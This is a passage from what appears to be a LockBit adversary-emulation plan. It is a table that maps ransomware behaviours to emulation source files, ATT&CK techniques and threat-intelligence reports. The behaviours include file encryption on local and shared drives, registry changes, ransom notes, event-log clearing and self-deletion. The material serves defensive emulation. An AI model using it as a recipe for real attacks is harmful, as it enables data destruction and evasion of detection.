| LockBit writes registry keys `HKCR\.<extension>` and `HKCR\<extension>\DefaultIcon` to customize icons for encrypted files | [SetEncryptedFileIcon](../Resources/Lockbit/src/common/impact/icon.cpp#L36-L84) | T1112 Modify Registry | [Antiy](https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a) |
| LockBit writes RSA public and private session keys to `HKCU\SOFTWARE\BlockBlit` via RegCreateKeyExW and RegSetValueExW | [StoreRsaSessionKeys](../Resources/Lockbit/src/common/impact/encryption.cpp#L431-L471) | T1112 Modify Registry | [Sophos](https://news.sophos.com/en-us/2020/04/24/lockbit-ransomware-borrows-tricks-to-keep-up-with-revil-and-maze/)<br>[Loxfo](https://blog.lexfo.fr/lockbit-malware.html) |
| RSA private session key is encrypted using RSA | [EncryptRsaPrivateSessionKey](../Resources/Lockbit/src/common/crypto/encryption.cpp#L205-L231) | T1027 Obfuscated Files or Information | [Sophos](https://news.sophos.com/en-us/2020/04/24/lockbit-ransomware-borrows-tricks-to-keep-up-with-revil-and-maze/)<br>[Loxfo](https://blog.lexfo.fr/lockbit-malware.html) |
| LockBit enumerates target files in main `C:` drive using FindFirstFileW and FindNextFileW | [EnumerateAndEncrypt](../Resources/Lockbit/src/common/enumerate.cpp#L67-L117) | T1083 File and Directory Discovery | [Antiy](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)<br>[Red Piranha](https://redpiranha.net/news/look-lockbit-3-ransomware) |
| LockBit encrypts target files in main `C:` using 256-bit AES | [EncryptFileAndAppendExtension](../Resources/Lockbit/src/common/impact/encryption.cpp#L333-L395) | T1486 Data Encrypted for Impact | [Antiy](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)<br>[Red Piranha](https://redpiranha.net/news/look-lockbit-3-ransomware) |
| LockBit enumerates target files in mounted file share `Z:` drive using FindFirstFileW and FindNextFileW | [EnumerateAndEncrypt](../Resources/Lockbit/src/common/enumerate.cpp#L67-L117) | T1083 File and Directory Discovery | [Sangfor](https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/lockbit-green-ransomware-conti-based-encryptor) |
| LockBit encrypts target files in mounted file share `Z:` drive using 256-bit AES | [EncryptFileAndAppendExtension](../Resources/Lockbit/src/common/impact/encryption.cpp#L333-L395) | T1486 Data Encrypted for Impact | [Antiy](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)<br>[Red Piranha](https://redpiranha.net/news/look-lockbit-3-ransomware) |
| LockBit drops a ransom note in traversed directories | [enumerateAndEncryptThreadFunc](../Resources/Lockbit/src/common/enumerate.cpp#L277-L282) | T1491.001 Defacement: Internal Defacement | [Antiy](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[Red Piranha](https://redpiranha.net/news/look-lockbit-3-ransomware) |
| LockBit modifies `HKCU\Control Panel\Desktop` via RegCreateKeyExW and RegSetValueExW | [ChangeWallPaper](../Resources/Lockbit/src/common/impact/wallpaper.cpp#L26-L62) | T1112 Modify Registry | [Antiy](https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| LockBit changes the current user's desktop wallpaper | [ChangeWallPaper](../Resources/Lockbit/src/common/impact/wallpaper.cpp#L26-L62) | T1491.001 Defacement: Internal Defacement | [Antiy](https://www.Antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a) |
| LockBit clears Windows Event Logs via EvtClearLog | [ClearAndDisableEventLogs](../Resources/Lockbit/src/lockbit_main/tamper/event_log.cpp#L9-L159) | T1070.001 Indicator Removal: Clear Windows Event Logs | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a) |
| LockBit disables event log channels via EvtSetChannelConfigProperty | [ClearAndDisableEventLogs](../Resources/Lockbit/src/lockbit_main/tamper/event_log.cpp#L126-L151) | T1562.002 Impair Defenses: Disable Windows Event Logging | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a) |
| LockBit spawns a helper process to overwrite, rename, and delete itself on completion | [invoke_self_del.cpp](../Resources/Lockbit/src/lockbit_main/def_evasion/invoke_self_del.cpp) | T1070.004 Indicator Removal: File Deletion | [CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)<br>[CISA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a) |

---

## :end: End of Execution
